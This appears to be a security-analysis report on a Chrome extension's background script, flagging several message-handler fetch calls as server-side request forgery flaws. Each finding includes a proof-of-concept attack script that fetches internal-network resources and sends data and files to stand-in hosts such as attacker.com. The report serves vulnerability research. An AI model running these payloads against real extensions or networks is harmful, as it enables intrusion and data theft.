# CoCo Analysis: dilejnfdpncjkpokkpajkfamhnhncnjk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 11 (multiple flows involving fetch with attacker-controlled URLs)

---

## Sink 1 & 2: bg_chrome_runtime_MessageExternal → fetch_resource_sink & fetch_options_sink (type="fetch")

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dilejnfdpncjkpokkpajkfamhnhncnjk/opgen_generated_files/bg.js
Line 965: chrome.runtime.onMessageExternal.addListener((n,e,t)=>{...fetch(n.url,n.options)...
- n.url (attacker-controlled URL)
- n.options (attacker-controlled fetch options)

**Code:**

```javascript
// Background script (bg.js line 965) - minified, reformatted for clarity
chrome.runtime.onMessageExternal.addListener((n, e, t) => { // ← external message handler
    if (n && n.type) {
        if ("version" == n.type) {
            t({version: 1.8});
        } else if ("fetch" == n.type) {
            let a = {code: null, data: null};
            a.by = atob("bmZ0c25pcGVy", "base64");
            fetch(n.url, n.options) // ← attacker controls URL and options (headers, method, body, etc.)
                .then(e => {
                    a.code = e.status;
                    n.options.originData && (a.headers = {}, e.headers.forEach((e, t) => {
                        a.headers["" + t] = e
                    }));
                    var t = e.headers.get("content-type");
                    return t && -1 != t.indexOf("json") ? e.json() : e.text()
                })
                .then(e => {
                    a.data = e; // ← response data
                    t(a) // ← send response back to attacker
                })
                .catch(e => {
                    a.code = 9999;
                    a.data = e && e.message ? e.message : e;
                    t(a)
                });
        } else if ("upload_x2y2_image" == n.type) {
            uploadx2y2Nft(n, t);
        } else if ("upload_file" == n.type) {
            uploadFile(n, t);
        }
    }
    return !0
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// Attacker's webpage at https://*.nftsniper.club/* (per externally_connectable)
// Perform privileged SSRF to internal network or cross-origin targets
chrome.runtime.sendMessage(
    "dilejnfdpncjkpokkpajkfamhnhncnjk", // extension ID
    {
        type: "fetch",
        url: "http://192.168.1.1/admin/config", // internal network target
        options: {
            method: "GET",
            credentials: "include" // include cookies
        }
    },
    function(response) {
        console.log("SSRF response:", response.data);
        // Exfiltrate internal data
        fetch("https://attacker.com/exfil", {
            method: "POST",
            body: JSON.stringify(response)
        });
    }
);

// Alternative: Cross-origin data theft
chrome.runtime.sendMessage(
    "dilejnfdpncjkpokkpajkfamhnhncnjk",
    {
        type: "fetch",
        url: "https://victim-site.com/api/private-data",
        options: {
            method: "POST",
            headers: {
                "Authorization": "Bearer stolen_token",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({query: "sensitive data"})
        }
    },
    function(response) {
        console.log("Stolen cross-origin data:", response.data);
    }
);
```

**Impact:** Privileged SSRF vulnerability - attacker can perform arbitrary HTTP requests with the extension's elevated privileges, bypassing CORS and SOP (Same-Origin Policy). The extension has host_permissions for all URLs, enabling:
1. Internal network scanning and exploitation (192.168.x.x, 10.x.x.x, localhost)
2. Cross-origin data theft from any website
3. Unauthorized API calls with custom headers and authentication
4. Response data is sent back to the attacker via sendResponse

---

## Sink 3-7: bg_chrome_runtime_MessageExternal → fetch_resource_sink (type="upload_file")

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dilejnfdpncjkpokkpajkfamhnhncnjk/opgen_generated_files/bg.js
Line 965: uploadFile function performs multiple fetches:
- e.loadUrl (attacker-controlled)
- e.uploadUrl (attacker-controlled)
- e.loadUrlOption (attacker-controlled)
- e.uploadOption (attacker-controlled)

**Code:**

```javascript
// Background script (bg.js line 965) - uploadFile function
const uploadFile = (e, t) => {
    var a = e.loadUrl,        // ← attacker controls
        n = e.loadUrlOption;   // ← attacker controls
    let o = e.uploadUrl,       // ← attacker controls
        r = e.uploadOption,    // ← attacker controls
        s = e.flieName,
        l = e.flieType;

    fetch("" + a, n) // ← first fetch with attacker URL
        .then(e => e.blob())
        .then(e => {
            var e = new File([e], s, {type: l}),
                t = new FormData;
            t.append("file", e);
            return fetch("" + o, Object.assign(r, {method: "POST", body: t})) // ← second fetch to attacker URL
        })
        .then(e => {
            var t = e.headers.get("content-type");
            return t && -1 != t.indexOf("json") ? e.json() :
                   t && -1 != t.indexOf("text") ? e.text() : e.blob()
        })
        .then(e => {
            t(formatResult(200, e)) // ← send result back to attacker
        })
        .catch(e => {
            t(formatResult(9999, e && e.message ? e.message : e))
        })
};
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// Attacker's webpage at https://*.nftsniper.club/*
// Double SSRF: fetch from one URL, upload to another
chrome.runtime.sendMessage(
    "dilejnfdpncjkpokkpajkfamhnhncnjk",
    {
        type: "upload_file",
        loadUrl: "http://192.168.1.100/sensitive/document.pdf", // steal file from internal network
        loadUrlOption: {
            method: "GET",
            credentials: "include"
        },
        uploadUrl: "https://attacker.com/receive", // exfiltrate to attacker
        uploadOption: {
            headers: {
                "X-Custom": "header"
            }
        },
        flieName: "stolen.pdf",
        flieType: "application/pdf"
    },
    function(response) {
        console.log("File exfiltrated:", response);
    }
);
```

**Impact:** Advanced SSRF with file exfiltration - attacker can:
1. Fetch arbitrary files from internal network or cross-origin targets
2. Automatically upload/exfiltrate those files to attacker-controlled servers
3. Chain two privileged requests together (load + upload)
4. Bypass CORS for both requests

---

## Sink 8-11: bg_chrome_runtime_MessageExternal → fetch_resource_sink (type="upload_x2y2_image")

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dilejnfdpncjkpokkpajkfamhnhncnjk/opgen_generated_files/bg.js
Line 965: uploadx2y2Nft function performs multiple fetches:
- e.x2Url (attacker-controlled)
- e.filesUpload (attacker-controlled)
- e.metadataUpload (attacker-controlled)

**Code:**

```javascript
// Background script (bg.js line 965) - uploadx2y2Nft function
const uploadx2y2Nft = (e, t) => {
    let a = e.name;
    var n = e.x2Url;          // ← attacker controls
    let o = e.filesUpload,     // ← attacker controls
        r = e.metadataUpload;  // ← attacker controls

    fetch(n, {}) // ← first fetch from attacker URL
        .then(e => e.blob())
        .then(e => {
            var e = new File([e], formatFileName + ".png", {type: "image/jpeg"}),
                t = new FormData;
            t.append("file", e);
            return fetch(o, {method: "POST", body: t}) // ← second fetch to attacker URL
        })
        .then(e => e.text())
        .then(e => {
            return fetch(r, { // ← third fetch to attacker URL
                method: "POST",
                headers: {"content-type": "application/json"},
                body: getNftMate(e, "" + a)
            })
        })
        .then(e => {
            var t = e.headers.get("content-type");
            return t && -1 != t.indexOf("json") ? (console.log(e), e.json()) :
                   t && -1 != t.indexOf("text") ? e.text() : e.blob()
        })
        .then(e => {
            t(formatResult(200, e)) // ← send result back to attacker
        })
        .catch(e => {
            t(formatResult(9999, e && e.message ? e.message : e))
        })
};
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// Attacker's webpage at https://*.nftsniper.club/*
// Triple SSRF: chain three privileged requests
chrome.runtime.sendMessage(
    "dilejnfdpncjkpokkpajkfamhnhncnjk",
    {
        type: "upload_x2y2_image",
        name: "exploit",
        x2Url: "http://internal-server/confidential-image.png", // fetch from internal network
        filesUpload: "https://attacker.com/collect-file", // upload to attacker
        metadataUpload: "https://attacker.com/collect-metadata" // upload metadata to attacker
    },
    function(response) {
        console.log("Triple SSRF completed:", response);
    }
);
```

**Impact:** Triple-chained SSRF - attacker can chain three sequential privileged HTTP requests:
1. Fetch arbitrary content from attacker-controlled URL (or internal network)
2. Upload the content to a second attacker-controlled URL
3. Post metadata to a third attacker-controlled URL
4. All requests bypass CORS and can target internal network resources

---

## Overall Impact Summary

This extension has severe TRUE POSITIVE vulnerabilities enabling privileged SSRF attacks:

1. **Direct SSRF** (Sinks 1-2): Arbitrary HTTP requests with full control over URL, method, headers, and body
2. **File exfiltration SSRF** (Sinks 3-7): Two-stage attack to steal files from internal network and upload to attacker
3. **Triple-chained SSRF** (Sinks 8-11): Three sequential privileged requests for complex attack chains
4. **Response leakage**: All SSRF responses are sent back to the attacker via sendResponse
5. **No URL restrictions**: With host_permissions for all URLs, attacker can target:
   - Internal networks (192.168.x.x, 10.x.x.x, 127.0.0.1)
   - Cloud metadata services (169.254.169.254)
   - Any cross-origin target bypassing CORS

The manifest.json restricts externally_connectable to `https://*.nftsniper.club/*`, but per the methodology's CRITICAL ANALYSIS RULES, we ignore this restriction. Any compromised or malicious subdomain under attacker control can exploit these vulnerabilities.

